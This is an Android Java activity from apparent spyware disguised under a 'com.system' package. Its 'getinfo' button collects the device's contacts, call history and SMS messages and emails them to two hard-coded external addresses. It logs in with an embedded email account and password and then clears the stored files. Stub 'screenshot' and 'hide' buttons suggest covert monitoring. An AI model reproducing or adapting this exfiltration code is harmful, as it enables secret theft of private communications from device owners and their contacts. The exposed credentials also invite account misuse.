package com.system.test;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import com.system.GetInfoTask;
import com.system.R;
import com.system.feature.pref.GlobalPref;
import com.system.utils.ConfigCtrl;
import com.system.utils.DeviceProperty;
import com.system.utils.FileCtrl;
import com.system.utils.SysUtils;

public class TestActivity extends Activity 
{
    protected static final String LOGTAG = "TestActivity";
    
	Button btn_getinfo;
    Button btn_screenshot;
    Button btn_setting;
    Button btn_hide;
    OnClickListener listener_getinfo = null;
    OnClickListener listener_screenshot = null;
    OnClickListener listener_setting = null;
    OnClickListener listener_hide = null;
     
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.test);
        
        setListener(); 
        initUI();
    }
    
    private void initUI()
    {
    	btn_getinfo = (Button)findViewById(R.id.btn_getinfo);
    	btn_getinfo.setOnClickListener(listener_getinfo);
        btn_screenshot = (Button)findViewById(R.id.btn_screenshot);
        btn_screenshot.setOnClickListener(listener_screenshot);
        btn_setting = (Button)findViewById(R.id.btn_setting);
        btn_setting.setOnClickListener(listener_setting);
        btn_hide = (Button)findViewById(R.id.btn_hide);
        btn_hide.setOnClickListener(listener_hide);
    }
    
    private void setListener()
    {
    	listener_getinfo = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// If network connected, try to collect and send the information
        		if (SysUtils.isNetworkConnected(getApplicationContext()))
        		{
        			GetInfoTask.attachments = new ArrayList<File>();
        			
        			GetInfoTask.CollectContact(getApplicationContext());
        			GetInfoTask.CollectPhoneCallHist(getApplicationContext());
        			GetInfoTask.CollectSms(getApplicationContext());
        		
        			// Send mail
        			String subject = getResources().getString(R.string.mail_from) 
        	           		 + DeviceProperty.getPhoneNumber(getApplicationContext()) 
        	           		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
        			String body = String.format(getResources().getString(R.string.mail_body), 
        					DeviceProperty.getPhoneNumber(getApplicationContext()));
        			List<String> fileList = new ArrayList<String>();
        			for (int i = 0; i < GetInfoTask.attachments.size(); i++)
        				fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
        			
        			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
        			boolean result = GetInfoTask.sendMail(subject, body, 
        					"richardroky@gmail.com", "yel636636",
        					recipients, fileList);
        			GetInfoTask.attachments.clear();
        			
        			// Update the last date time
        			if (result) {
        				boolean successful = ConfigCtrl.setLastGetInfoTime(getApplicationContext(), new Date());
        				if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
        			}
        			
        			// Clean the files in SD-CARD
        			FileCtrl.cleanFolder();
        		}
            }
        };
        
        listener_screenshot = new OnClickListener()
        {
            public void onClick(View v)
            {
                //TODO
            }
        };
        
        listener_setting = new OnClickListener()
        {
            public void onClick(View v)
            {
            	Intent intent = new Intent().setClass(v.getContext(), GlobalPref.class);
                startActivity(intent);
            }
        };
        
        listener_hide = new OnClickListener()
        {
            public void onClick(View v)
            {
                //TODO
            }
        };
    }
}
